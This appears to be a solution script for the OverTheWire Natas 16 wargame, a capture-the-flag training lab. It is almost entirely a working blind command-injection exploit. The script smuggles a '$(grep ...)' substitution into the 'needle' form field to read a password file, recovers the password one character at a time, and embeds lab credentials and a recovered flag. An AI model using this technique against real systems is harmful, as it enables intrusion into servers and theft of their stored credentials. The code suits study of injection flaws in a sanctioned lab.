import string
import requests

url = 'http://natas16.natas.labs.overthewire.org'
username = 'natas16'
passwd = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
alphabet = ''.join([string.ascii_letters, string.digits])
#flag = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
flag = ''
found = False
pattern = 'African'

for ch in alphabet:
    print(ch)
    res = requests.post(url, data={'needle': '$(grep -E ^' + flag + ch + '.* /etc/natas_webpass/natas17)African'}, auth=(username, passwd)) 
    if not pattern in res.text:
        found = True
        flag += ch
        break

while (found):
    print('Flag prefix:' + flag)
    found = False
    for ch in alphabet:
        print(ch)
        res = requests.post(url, data={'needle': '$(grep -E ^' + flag + ch + '.* /etc/natas_webpass/natas17)African'}, auth=(username, passwd)) 
        if not pattern in res.text:
            found = True
            flag += ch
            break


